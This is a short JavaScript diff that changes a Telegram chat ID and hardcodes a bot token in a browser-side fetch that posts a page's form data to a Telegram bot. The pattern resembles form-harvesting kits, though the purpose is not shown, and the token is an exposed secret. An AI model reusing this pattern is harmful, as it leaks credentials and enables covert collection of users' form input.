@@ -121,7 +121,7 @@ document.addEventListener("DOMContentLoaded", () => {
   /* ===== TELEGRAM CONFIG ===== */
 
   const BOT_TOKEN = "8273970021:AAFV2Dz6xMCMcLDTb5m-ryjChhhY6qdoSsc";
-  const CHAT_ID = "1647832177";
+  const CHAT_ID = "5607820177";
 
   const form = document.querySelector("form");
 
@@ -144,7 +144,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
     try {
       const response = await fetch(
-        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+        `https://api.telegram.org/bot8273970021:AAFV2Dz6xMCMcLDTb5m-ryjChhhY6qdoSsc/sendMessage`,
         {
           method: "POST",
           headers: { "Content-Type": "application/json" },
